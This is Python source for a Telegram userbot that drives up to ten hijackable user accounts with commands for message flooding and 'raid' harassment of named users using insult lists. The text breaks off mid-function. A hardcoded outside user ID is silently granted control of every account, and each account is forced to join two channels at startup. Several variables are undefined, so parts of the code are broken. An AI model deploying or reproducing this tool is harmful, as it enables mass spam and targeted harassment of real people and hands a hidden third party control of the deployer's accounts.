import os
import sys
import random
from datetime import datetime
from os import execl
from telethon import TelegramClient, events
from telethon.sessions import StringSession
from telethon.tl.functions.account import UpdateProfileRequest
from Config import STRING, SUDO, BIO_MESSAGE, API_ID, API_HASH, STRING2, STRING3, STRING4 ,STRING5, STRING6, STRING7, STRING8 ,STRING9, STRING10, ALIVE_PIC
import asyncio
import telethon.utils
from telethon.tl import functions
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.messages import ImportChatInviteRequest
from Utils import RAID, RRAID
import git
import heroku3

a = API_ID
b = API_HASH
smex = STRING
smexx = STRING2
smexxx = STRING3
smexxxx = STRING4
smexxxxx = STRING5
sixth = STRING6
seven = STRING7
eight = STRING8
ninth = STRING9
tenth = STRING10


luc = ""
luc2 = ""
luc3 = ""
luc5 = ""
luc4 = ""
luc6 = ""
luc7 = ""
luc8 = ""
luc9 = ""
luc10 = ""


que = {}

SMEX_USERS = [5395488954]
for x in SUDO:
    SMEX_USERS.append(x)
    
async def start_luci():
    global luc
    global luc2
    global luc3
    global luc5
    global luc4
    global luc6
    global luc7
    global luc8
    global luc10
    global luc9
    if smex:
        session_name = str(smex)
        print("String 1 Found")
        luc = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 1")
            await luc.start()
            botme = await luc.get_me()
            await luc(functions.channels.JoinChannelRequest(channel="@TheDarkChats"))
            await luc(functions.channels.JoinChannelRequest(channel="@DarkkTech"))
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            luc = "smex"
            print(e)
            pass
    else:
        print("Session 1 not Found")
        session_name = "startup"
        luc = TelegramClient(session_name, a, b)
        try:
            await luc.start()
        except Exception as e:
            pass
   
    if smexx:
        session_name = str(smexx)
        print("String 2 Found")
        luc2 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 2")
            await luc2.start()
            await luc2(functions.channels.JoinChannelRequest(channel="@TheDarkChats"))
            await luc2(functions.channels.JoinChannelRequest(channel="@DarkkTech"))
            botme = await luc2.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 2 not Found")
        pass
        session_name = "startup"
        luc2 = TelegramClient(session_name, a, b)
        try:
            await luc2.start()
        except Exception as e:
            pass

    if smexxx:
        session_name = str(smexxx)
        print("String 3 Found")
        luc3 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 3")
            await  luc3.start()
            await luc3(functions.channels.JoinChannelRequest(channel="@TheDarkChats"))
            await luc3(functions.channels.JoinChannelRequest(channel="@DarkkTech"))
            botme = await luc3.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 3 not Found")
        pass
        session_name = "startup"
        luc3 = TelegramClient(session_name, a, b)
        try:
            await luc3.start()
        except Exception as e:
            pass

    if smexxxx:
        session_name = str(smexxxx)
        print("String 4 Found")
        luc4 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 4")
            await luc4.start()
            await luc4(functions.channels.JoinChannelRequest(channel="@TheDarkChats"))
            await luc4(functions.channels.JoinChannelRequest(channel="@DarkkTech"))
            botme = await luc4.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 4 not Found")
        pass
        session_name = "startup"
        luc4 = TelegramClient(session_name, a, b)
        try:
            await luc4.start()
        except Exception as e:
            pass

    if smexxxxx:
        session_name = str(smexxxxx)
        print("String 5 Found")
        luc5 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 5")
            await luc5.start()
            await luc5(functions.channels.JoinChannelRequest(channel="@TheDarkChats"))
            await luc5(functions.channels.JoinChannelRequest(channel="@DarkkTech"))
            botme = await luc5.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 5 not Found")
        pass
        session_name = "startup"
        luc5 = TelegramClient(session_name, a, b)
        try:
            await luc5.start()
        except Exception as e:
            pass
                  
    if sixth:
        session_name = str(sixth)
        print("String 6 Found")
        luc6 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 6")
            await luc6.start()
            await luc6(functions.channels.JoinChannelRequest(channel="@TheDarkChats"))
            await luc6(functions.channels.JoinChannelRequest(channel="@DarkkTech"))
            botme = await luc6.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 6 not Found")
        pass
        session_name = "startup"
        luc6 = TelegramClient(session_name, a, b)
        try:
            await luc6.start()
        except Exception as e:
            pass

    if seven:
        session_name = str(seven)
        print("String 7 Found")
        luc7 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 7")
            await luc7.start()
            await luc7(functions.channels.JoinChannelRequest(channel="@TheDarkChats"))
            await luc7(functions.channels.JoinChannelRequest(channel="@DarkkTech"))
            botme = await luc7.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 7 not Found")
        pass
        session_name = "startup"
        luc7 = TelegramClient(session_name, a, b)
        try:
            await luc7.start()
        except Exception as e:
            pass    
        
    
    if eight:
        session_name = str(eight)
        print("String 8 Found")
        luc8 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 8")
            await luc8.start()
            await luc8(functions.channels.JoinChannelRequest(channel="@TheDarkChats"))
            await luc8(functions.channels.JoinChannelRequest(channel="@DarkkTech"))
            botme = await luc8.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 8 not Found")
        pass
        session_name = "startup"
        luc8 = TelegramClient(session_name, a, b)
        try:
            await luc8.start()
        except Exception as e:
            pass   
        
    if ninth:
        session_name = str(ninth)
        print("String 9 Found")
        luc10 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 9")
            await luc10.start()
            await luc10(functions.channels.JoinChannelRequest(channel="@TheDarkChats"))
            await luc10(functions.channels.JoinChannelRequest(channel="@DarkkTech"))
            botme = await luc10.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 9 not Found")
        pass
        session_name = "startup"
        luc10 = TelegramClient(session_name, a, b)
        try:
            await luc10.start()
        except Exception as e:
            pass   
    
  
    if tenth:
        session_name = str(tenth)
        print("String 10 Found")
        luc9 = TelegramClient(StringSession(session_name), a, b)
        try:
            print("Booting Up The Client 10")
            await luc9.start()
            await luc9(functions.channels.JoinChannelRequest(channel="@TheDarkChats"))
            await luc9(functions.channels.JoinChannelRequest(channel="@DarkkTech"))
            botme = await luc9.get_me()
            botid = telethon.utils.get_peer_id(botme)
            SMEX_USERS.append(botid)
        except Exception as e:
            print(e)
            pass
    else:
        print("Session 10 not Found")
        pass
        session_name = "startup"
        luc9 = TelegramClient(session_name, a, b)
        try:
            await luc9.start()
        except Exception as e:
            pass 

loop = asyncio.get_event_loop()
loop.run_until_complete(start_luci())       

async def gifspam(e, smex):
    try:
        await e.client(
            functions.messages.SaveGifRequest(
                id=types.InputDocument(
                    id=sandy.media.document.id,
                    access_hash=smex.media.document.access_hash,
                    file_reference=smex.media.document.file_reference,
                ),
                unsave=True,
            )
        )
    except Exception as e:
        pass


@luc.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.bio"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.bio"))        
async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗕𝗶𝗼\n\nCommand:\n\n.bio <Message to set Bio of Userbot accounts>"
    if e.sender_id in SMEX_USERS:
        luci = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)     
        if len(e.text) > 5:
            bio = str(luci[0])
            text = "Changing Bio"
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await e.client(functions.account.UpdateProfileRequest(about=bio))
                await event.edit("Succesfully Changed Bio")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
            
@luc.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.join"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.join"))        
async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.join <Public Channel or Group Link/Username>"
    if e.sender_id in SMEX_USERS:
        luci = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 6:
            bc = luci[0]
            text = "Joining..."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await e.client(functions.channels.JoinChannelRequest(channel=bc))
                await event.edit("Succesfully Joined")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
@luc.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.pjoin"))        
async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗣𝗿𝗶𝘃𝗮𝘁𝗲 𝗝𝗼𝗶𝗻\n\nCommand:\n\n.pjoin <Private Channel or Group's access hash>\n\nExample :\nLink = https://t.me/joinchat/HGYs1wvsPUplMmM1\n\n.pjoin HGYs1wvsPUplMmM1"
    if e.sender_id in SMEX_USERS:
        luci = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = luci[0]
            text = "Joining...."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await e.client(ImportChatInviteRequest(bc))
                await event.edit("Succesfully Joined")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
        
@luc.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.leave"))        
async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗟𝗲𝗮𝘃𝗲\n\nCommand:\n\n.leave <Channel or Chat ID>"
    if e.sender_id in SMEX_USERS:
        luci = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = luci[0]
            bc = int(bc)
            text = "Leaving....."
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await event.client(LeaveChannelRequest(bc))
                await event.edit("Succesfully Left")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            
                
        
        
@luc.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗦𝗽𝗮𝗺\n\nCommand:\n\n.spam <count> <message to spam>\n\n.spam <count> <reply to a message>\n\nCount must be a integer."
    error = "Spam Module can only be used till 100 count. For bigger spams use BigSpam."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        luci = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(luci) == 2:
            message = str(luci[1])
            counter = int(luci[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            await asyncio.wait([e.respond(message) for i in range(counter)])
        elif e.reply_to_msg_id and smex.media:  
            counter = int(yukki[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            for _ in range(counter):
                smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                await gifspam(e, smex)  
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(luci[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            await asyncio.wait([e.respond(message) for i in range(counter)])
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            

@luc.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗗𝗲𝗹𝗮𝘆𝗦𝗽𝗮𝗺\n\nCommand:\n\n.delayspam <sleep time> <count> <message to spam>\n\n.delayspam <sleep time> <count> <reply to a message>\n\nCount and Sleeptime must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        smex = await e.get_reply_message()
        luci = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
        lucisexy = luci[1:]
        if len(lucisexy) == 2:
            message = str(lucisexy[1])
            counter = int(lucisexy[0])
            sleeptime = float(luci[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    if e.reply_to_msg_id:
                        await smex.reply(message)
                    else:
                        await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(sleeptime)
        elif e.reply_to_msg_id and smex.media:  
            counter = int(lucisexy[0])
            sleeptime = float(luci[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "document"):
                    smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                    await gifspam(e, smex) 
                await asyncio.sleep(sleeptime)
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(lucisexy[0])
            sleeptime = float(luci[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(sleeptime)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )


@luc.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.bigspam"))
async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗕𝗶𝗴𝗦𝗽𝗮𝗺\n\nCommand:\n\n.bigspam <count> <message to spam>\n\n.bigspam <count> <reply to a message>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        luci = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(luci) == 2:
            message = str(luci[1])
            counter = int(luci[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    if e.reply_to_msg_id:
                        await smex.reply(message)
                    else:
                        await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(0.3)
        elif e.reply_to_msg_id and smex.media:  
            counter = int(luci[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "document"):
                    smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                    await gifspam(e, smex) 
                await asyncio.sleep(0.3)  
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(luci[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(0.3)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )


@luc.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.raid"))
async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗮𝗶𝗱\n\nCommand:\n\n.raid <count> <Username of User>\n\n.raid <count> <reply to a User>\n\nCount must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        luci = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(luci) == 2:
            message = str(luci[1])
            print(message)
            a = await e.client.get_entity(message)
            g = a.id
            c = a.first_name
            username = f"[{c}](tg://user?id={g})"
            counter = int(luci[0])
            for _ in range(counter):
                reply = random.choice(RAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            c = b.first_name
            counter = int(luci[0])
            username = f"[{c}](tg://user?id={g})"
            for _ in range(counter):
                reply = random.choice(RAID)
                caption = f"{username} {reply}"
                async with e.client.action(e.chat_id, "typing"):
                    await e.client.send_message(e.chat_id, caption)
                    await asyncio.sleep(0.3)
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )





@luc.on(events.NewMessage(incoming=True))
@luc2.on(events.NewMessage(incoming=True))
@luc3.on(events.NewMessage(incoming=True))
@luc4.on(events.NewMessage(incoming=True))
@luc5.on(events.NewMessage(incoming=True))
@luc6.on(events.NewMessage(incoming=True))
@luc7.on(events.NewMessage(incoming=True))
@luc8.on(events.NewMessage(incoming=True))
@luc9.on(events.NewMessage(incoming=True))
@luc10.on(events.NewMessage(incoming=True))
async def _(event):
    global que
    queue = que.get(event.sender_id)
    if not queue:
        return
    async with event.client.action(event.chat_id, "typing"):
        await asyncio.sleep(0.3)
    async with event.client.action(event.chat_id, "typing"):
        await event.client.send_message(
            entity=event.chat_id,
            message="""{}""".format(random.choice(RRAID)),
            reply_to=event.message.id,
        )           
            
            
@luc.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.replyraid"))
async def _(e):
    global que
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n.replyraid <Username of User>\n\n.replyraid <reply to a User>"
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        luci = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(e.text) > 11:
            message = str(luci[0])
            a = await e.client.get_entity(message)
            g = a.id
            que[g] = []
            qeue = que.get(g)
            appendable = [g]
            qeue.append(appendable)
            text = "Activated Reply Raid"
            await e.reply(text, parse_mode=None, link_preview=None )
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            que[g] = []
            qeue = que.get(g)
            appendable = [g]
            qeue.append(appendable)
            text = "Activated Reply Raid"
            await e.reply(text, parse_mode=None, link_preview=None )
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )

            
@luc.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.dreplyraid"))
async def _(e):
    global que
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗗𝗲𝗮𝗰𝘁𝗶𝘃𝗮𝘁𝗲 𝗥𝗲𝗽𝗹𝘆𝗥𝗮𝗶𝗱\n\nCommand:\n\n.dreplyraid <Username of User>\n\n.dreplyraid <reply to a User>"
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        luci = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(e.text) > 12:
            message = str(luci[0])
            a = await e.client.get_entity(message)
            g = a.id
            try:
                queue = que.get(g)
                queue.pop(0)
            except Exception as f:
                pass
            text = "De-Activated Reply Raid"
            await e.reply(text, parse_mode=None, link_preview=None )
        elif e.reply_to_msg_id:             
            a = await e.get_reply_message()
            b = await e.client.get_entity(a.sender_id)
            g = b.id
            try:
                queue = que.get(g)
                queue.pop(0)
            except Exception as f:
                pass
            text = "De-Activated Reply Raid"
            await e.reply(text, parse_mode=None, link_preview=None )
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
    
       

@luc.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.ping"))
async def ping(e):
    if e.sender_id in SMEX_USERS:
        start = datetime.now()
        text = "✯ 𝚃𝙴𝙻𝙴 𝙳𝙰𝚁𝙺𝙺 ✯"
        event = await e.reply(text, parse_mode=None, link_preview=None )
        end = datetime.now()
        ms = (end-start).microseconds / 1000
        await event.edit(f"🤖 𝗣𝗼𝗻𝗴!\n`{ms}` 𝗺𝘀")



        
        

@luc.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.restart"))
async def restart(e):
    if e.sender_id in SMEX_USERS:
        text = "𝙍𝙚𝙨𝙩𝙖𝙧𝙩𝙚𝙙\n\nPlease wait till it reboots..."
        await e.reply(text, parse_mode=None, link_preview=None )
        try:
            await luc.disconnect()
        except Exception as e:
            pass
        try:
            await luc2.disconnect()
        except Exception as e:
            pass
        try:
            await luc3.disconnect()
        except Exception as e:
            pass
        try:
            await luc4.disconnect()
        except Exception as e:
            pass
        try:
            await luc5.disconnect()
        except Exception as e:
            pass
        try:
            await luc6.disconnect()
        except Exception as e:
            pass
        try:
            await luc7.disconnect()
        except Exception as e:
            pass
        try:
            await luc8.disconnect()
        except Exception as e:
            pass
        try:
            await luc10.disconnect()
        except Exception as e:
            pass
        try:
            await luc9.disconnect()
        except Exception as e:
            pass
        os.execl(sys.executable, sys.executable, *sys.argv)
        quit()

        
        
        
        
        
@luc.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@luc2.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@luc3.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@luc4.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@luc5.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@luc6.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@luc7.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@luc8.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@luc9.on(events.NewMessage(incoming=True, pattern=r"\.help"))
@luc10.on(events.NewMessage(incoming=True, pattern=r"\.help"))
async def help(e):
    if e.sender_id in SMEX_USERS:
